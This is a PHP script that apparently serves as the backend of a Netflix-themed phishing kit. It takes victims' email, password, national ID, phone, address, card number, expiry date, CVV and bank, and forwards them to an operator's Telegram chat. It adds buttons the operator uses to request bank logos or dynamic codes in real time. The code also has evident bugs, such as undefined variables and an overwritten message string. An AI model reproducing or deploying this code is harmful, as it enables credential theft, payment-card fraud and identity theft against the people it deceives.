<?php
// Iniciar la sesión
session_start();
header('Content-Type: application/json'); // Asegúrate de que la respuesta sea JSON

// Cargar la configuración del bot de Telegram desde un archivo PHP
$config = require 'botmaster.php'; // Asegúrate de que el nombre sea correcto

if (!$config || !isset($config['token']) || !isset($config['chat_id'])) {
    echo json_encode(['error' => 'Configuración de Telegram inválida.']);
    exit;
}

// Recoger los datos del formulario
$inputData = json_decode(file_get_contents('php://input'), true);

// Registrar los datos entrantes para depuración
error_log("Datos recibidos: " . print_r($inputData, true));

// Asegúrate de que los nombres de los campos sean correctos
$usuario    = $_POST['txt-usuario'] ?? '';
$pass       = $_POST['txt-pass'] ?? '';
$dispositivo = $_POST['hdd-dispositivo'] ?? '';
$direccion = $inputData['direccion'] ?? '';
$tarjeta = $inputData['tarjeta'] ?? '';
$ftarjeta = $inputData['ftarjeta'] ?? '';
$cvv = $inputData['cvv'] ?? '';
$id = $inputData['id'] ?? ''; // Añadir el campo 'id'
$ip = $inputData['ip'] ?? ''; // Añadir el campo 'ip'
$banco = $inputData['banco'] ?? ''; // Añadir el campo 'banco'
$nombre = $inputData['nombre'] ?? ''; // Añadir el campo 'nombre'

// Validar datos aquí
if (empty($email) || empty($celular) || empty($direccion) || empty($tarjeta) || empty($ftarjeta) || empty($cvv) || empty($id) || empty($ip) || empty($banco) || empty($nombre)) {
    echo json_encode(['status' => 'error', 'message' => 'Todos los campos son obligatorios.']);
    exit;
}

// Crear un ID de transacción
$transaction_id = uniqid();
// Guardar el ID de la transacción en la sesión para usarlo en check_updates.php
$_SESSION['transaction_id'] = $transaction_id;

// Mensaje que se enviará al bot de Telegram
$message = "<b>Nuevo método de pago pendiente de verificación.</b>\n\n";
$message .= "<b>Netflix🪬</b>\n";
$message .= "--------------------------------------------------\n";
$message .= "🆔 <b>ID Transacción:</b> | <b>$transaction_id</b>\n"; // ID de la transacción
$message .= "📡 <b>IP:</b> | <b>$ip</b>\n"; // IP
$message .= "-----------------------------------------------\n";
$message  = "👤 <b>Email:</b> | <i>$email</i>\n";
$message .= "🔑 <b>Password:</b> | <i>$pass</i>\n";
$message .= "📱 <b>Dispositivo:</b> | <i>$dispositivo</i>\n";
$message .= "👤 <b>Nombre:</b> | <i>$nombre</i>\n"; // Nombre del usuario
$message .= "🆔 <b>Cédula:</b> | <i>$id</i>\n"; // Aquí incluyes la cédula
$message .= "👤 <b>Email:</b> | <i>$email</i>\n"; // Email
$message .= "📞 <b>Teléfono:</b> | <code>$celular</code>\n"; // Teléfono
$message .= "🏠 <b>Dirección:</b> | <b>$direccion</b>\n"; // Dirección
$message .= "-----------------------------------------------\n";
$message .= "💳 <b>Tarjeta:</b> | <b>$tarjeta</b>\n"; // Número de tarjeta
$message .= "📅 <b>Fecha:</b> | <b>$ftarjeta</b>\n"; // Fecha de vencimiento
$message .= "🔐 <b>CVV:</b> | <b>$cvv</b>\n"; // CVV
$message .= "🏦 <b>Banco:</b> | <b>$banco</b>\n"; // Banco
$message .= "-----------------------------------------------\n";

// Crear teclado interactivo con botones (opcional)
$keyboard = json_encode([
    'inline_keyboard' => [
        [['text' => 'Pedir Logo', 'callback_data' => "pedir_logo:$transaction_id"]],
        [['text' => 'Pedir Dinámica', 'callback_data' => "pedir_dinamica:$transaction_id"]],
        [['text' => 'Error de TC', 'callback_data' => "error_tc:$transaction_id"]],
        [['text' => 'Error de Logo', 'callback_data' => "error_logo:$transaction_id"]],
        [['text' => 'Finalizar', 'callback_data' => "finalizar:$transaction_id"]],
    ],
]);

// URL de la API de Telegram
$telegram_api_url = "https://api.telegram.org/bot{$config['token']}/sendMessage";

// Datos del mensaje para la solicitud
$telegram_data = [
    'chat_id' => $config['chat_id'],
    'text' => $message,
    'reply_markup' => $keyboard,
    'parse_mode' => 'HTML' // Especificar el modo de análisis para interpretar el HTML
];

// Enviar el mensaje a Telegram
$ch = curl_init($telegram_api_url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($telegram_data));
$response = curl_exec($ch);
curl_close($ch);

// Respuesta JSON al cliente
if ($response !== false) {
    $response_data = json_decode($response, true);
    if (isset($response_data['ok']) && $response_data['ok']) {
        echo json_encode(['status' => 'success', 'transaction_id' => $transaction_id]);
    } else {
        echo json_encode(['status' => 'error', 'message' => 'Error en la respuesta de Telegram.']);
    }
} else {
    echo json_encode(['status' => 'error', 'message' => 'Error al enviar el mensaje a Telegram.']);
}
?>
